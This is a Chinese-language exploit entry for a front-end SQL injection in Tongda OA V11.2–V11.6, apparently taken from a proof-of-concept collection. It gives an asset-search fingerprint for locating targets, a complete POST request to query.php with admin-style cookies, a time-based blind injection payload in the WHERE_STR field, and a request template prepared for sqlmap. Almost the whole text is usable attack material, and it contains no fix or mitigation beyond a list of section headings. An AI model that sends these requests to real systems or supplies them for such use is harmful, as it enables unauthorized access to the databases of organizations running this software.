# 通达OAWHERE_STR存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=a817a534f7c99980f8be6ad061b4c2cb; USER_NAME_COOKIE=admin; OA_USER_ID=a…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 0`

**请求体 / payload**
```
WHERE_STR=-@`'` AND (SELECT 4916 FROM (SELECT(SLEEP(5)))Xsep)

sqlmap
POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=a817a534f7c99980f8be6ad061b4c2cb; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c589adfc; UI_COOKIE=0; KEY_RANDOMDATA=13568
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
WHERE_STR=-@`'`
```

**其他**
- 通达OA WHERE\_STR 存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA V11.2-通达V11.6